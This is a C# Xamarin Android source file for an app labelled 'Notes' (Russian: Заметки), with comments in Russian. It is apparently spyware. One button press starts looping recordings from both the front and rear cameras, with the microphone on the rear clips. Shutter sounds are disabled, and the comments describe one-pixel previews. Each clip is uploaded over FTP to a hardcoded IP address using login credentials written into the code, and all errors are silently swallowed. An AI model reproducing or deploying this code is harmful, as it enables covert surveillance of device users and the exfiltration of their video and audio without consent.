using Android.App;
using Android.OS;
using Android.Support.V7.App;
using Android.Runtime;
using Android.Widget;
using Android.Media;
using System.Threading.Tasks;
using Android.Hardware;
using System;
using FluentFTP;
using System.Net;
using Java.IO;

namespace App1
{
    [Activity(Label = "Заметки", Theme = "@style/AppTheme", MainLauncher = true)]

    public class MainActivity : AppCompatActivity
    {
        //Задаём 2 медиарекордера
        MediaRecorder recorder;
        MediaRecorder frontrecorder;
        public int i = 0;
        public int a = 0;
        public int b = 0;
        public int c = 0;
        //создаём клиент, задаёт адрес ФТП
        public FtpClient client = new FtpClient("93.189.41.9");
        [System.Obsolete]
        protected override async void OnCreate(Bundle bundle)
        {
            try
            {
                base.OnCreate(bundle);
                //Логин и пароль от ФТП
                client.Credentials = new NetworkCredential("u163406", "JzjTZ3OPl0Ob");
                Xamarin.Essentials.Platform.Init(this, bundle);
                SetContentView(Resource.Layout.activity_main);
                //Record - кнопка, остальные 2 - превью камер (по 1пикселю размером)
                var record = FindViewById<Button>(Resource.Id.Record);
                var video = FindViewById<VideoView>(Resource.Id.SampleVideoView);
                var frontvideo = FindViewById<VideoView>(Resource.Id.SampleVideoViewFront);

                //Ненужный блок, показывает уведомление если нету фронтальной камеры
                if (Camera.NumberOfCameras < 2)
                {
                    Toast.MakeText(this, "Front camera missing", ToastLength.Long).Show();
                    return;
                }
                //Задаём на переменную Camera фронталку (0 - задняя, 1 - фронт (наверно))
                var camera = Camera.Open(1);
                //Не уверен что параметры работают в принципе, но решил их оставить 
                Android.Hardware.Camera.Parameters parameters = camera.GetParameters();
                parameters.SetPictureSize(1920, 1080);
                camera.SetParameters(parameters);
                camera.EnableShutterSound(false);
                camera.SetDisplayOrientation(90);
                var rearcamera = Camera.Open(0);
                Android.Hardware.Camera.Parameters rearparameters = rearcamera.GetParameters();
                rearparameters.SetPictureSize(1920, 1080);
                rearcamera.SetDisplayOrientation(90);
                rearcamera.EnableShutterSound(false);
                rearcamera.SetParameters(rearparameters);

                //Первый обработчик, отвечает за заднюю камеру
                record.Click += async delegate
                {
                    i = 1;
                    while (i == 1)
                    {
                        try
                        {
                            rearcamera.Unlock();
                            recorder = new MediaRecorder();
                            recorder.SetCamera(rearcamera);
                            recorder.SetVideoSource(VideoSource.Camera);
                            recorder.SetAudioSource(AudioSource.Mic);
                            recorder.SetOutputFormat(OutputFormat.Default);
                            recorder.SetVideoEncoder(VideoEncoder.Default);
                            recorder.SetAudioEncoder(AudioEncoder.Default);
                            //Битрейт и разрешение.
                            recorder.SetVideoEncodingBitRate(12000);
                            recorder.SetVideoSize(1920, 1080);
                            //Адрес локального сохранения файла
                            recorder.SetOutputFile(Android.OS.Environment.ExternalStorageDirectory.AbsolutePath + "/test" + a + ".mp4");
                            recorder.SetPreviewDisplay(video.Holder.Surface);
                            recorder.Prepare();
                            recorder.Start();
                            await Task.Delay(5000);
                            a++;
                            recorder.Stop();
                            recorder.Reset();
                        }
                        catch (Exception ex)
                        {
                        }

                    }

                };
                //Обработчик кнопки, отвечающий за фронтальную камеру.
                record.Click += async delegate
                {
                    await sendfile();
                };
                record.Click += async delegate
                {
                    b = 1;
                    while (b == 1)
                    {
                        try
                        {
                            camera.Unlock();
                            frontrecorder = new MediaRecorder();
                            frontrecorder.SetCamera(camera);
                            frontrecorder.SetVideoSource(VideoSource.Camera);
                            frontrecorder.SetOutputFormat(OutputFormat.Default);
                            frontrecorder.SetVideoEncoder(VideoEncoder.Default);
                            //Битрейт и разрешение.
                            frontrecorder.SetVideoEncodingBitRate(6000);
                            frontrecorder.SetVideoSize(1280, 720);
                            //Адрес локального сохранения файла
                            frontrecorder.SetOutputFile(Android.OS.Environment.ExternalStorageDirectory.AbsolutePath + "/fronttest" + c + ".mp4");
                            frontrecorder.SetPreviewDisplay(frontvideo.Holder.Surface);
                            frontrecorder.Prepare();
                            frontrecorder.Start();
                            await Task.Delay(5000);
                            c++;
                            frontrecorder.Stop();
                            frontrecorder.Reset();
                        }
                        catch (Exception ex)
                        {
                        }
                    }
                };
            }
            catch (System.Exception ex)
            {
            }
        }
        public async Task sendfile()
        {
            try
            {
                int b = 1;
                int x = 0;
                int y = 0;
                await Task.Delay(7000);
                while (b == 1)
                {
                    if (!client.IsConnected)
                        client.Connect();
                    //Адреса - 1й локальный, откуда загружать файл, второй - адрес на сервере, куда загружать
                    File file = new File(Android.OS.Environment.ExternalStorageDirectory.AbsolutePath + "/fronttest" + x + ".mp4");
                    await Task.Delay(5000);
                    if (file.Exists())
                    {
                        await client.UploadFileAsync(Android.OS.Environment.ExternalStorageDirectory.AbsolutePath + "/fronttest" + x + ".mp4", "/fronttest" + x + ".mp4");
                        x++;
                    }
                    File rearfile = new File(Android.OS.Environment.ExternalStorageDirectory.AbsolutePath + "/test" + y + ".mp4");
                    if (rearfile.Exists())
                    {
                        await client.UploadFileAsync(Android.OS.Environment.ExternalStorageDirectory.AbsolutePath + "/test" + y + ".mp4", "/test" + y + ".mp4");
                        y++;

                    }
                }
            }
            catch (Exception ex)
            {

            }
        }
        protected override void OnDestroy()
        {
            base.OnDestroy();
            if (recorder != null)
            {
                recorder.Release();
                recorder.Dispose();
                recorder = null;
                frontrecorder.Release();
                frontrecorder.Dispose();
                frontrecorder = null;
            }
        }

        public override void OnRequestPermissionsResult(int requestCode, string[] permissions, [GeneratedEnum] Android.Content.PM.Permission[] grantResults)
        {
            Xamarin.Essentials.Platform.OnRequestPermissionsResult(requestCode, permissions, grantResults);

            base.OnRequestPermissionsResult(requestCode, permissions, grantResults);
        }
    }
}